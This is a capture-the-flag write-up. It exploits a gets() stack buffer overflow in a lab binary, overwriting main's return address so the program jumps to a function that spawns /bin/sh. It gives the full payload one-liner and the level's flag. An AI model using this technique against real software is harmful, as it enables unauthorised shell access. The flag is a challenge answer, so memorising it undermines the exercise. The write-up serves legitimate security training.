Decompiling the program we find a buffer overflow, since we use `gets` on a buffer with a limited size:
```c
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}

void main(void)
{
  char local_50 [76];
  gets(local_50);
  return;
}
```

So what we can do here is changing the return address of the main in the stack, making it return to `run()` instead of the normal return.

We therefore need to find the address of `run()` with `objdump`: 
```bash
objdump -d level1
```

Output: 
```bash
08048444 <run>:
```

And transform it to little endian and hex format:
```
\x44\x84\x04\x08
```
Finally, we need to generate a big enough number of backfill characters to cause the overflow:
```bash
python -c 'print("A" * 76)'
```

The payload now looks like this:

```bash
python -c 'print("A" * 76 + b"\x44\x84\x04\x08")'
```

Last problem though, the shell opened is not interactive and returns immediately. We need to keep the ouput open using cat:
```bash
(python -c 'print("A" * 76 + b"\x44\x84\x04\x08")'; cat) | ./level1
```

Flag: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`

Reference: [Buffer Overflow Examples, Overwriting a function pointer - protostar stack3 - 0xRick’s Blog](https://0xrick.github.io/binary-exploitation/bof3/)

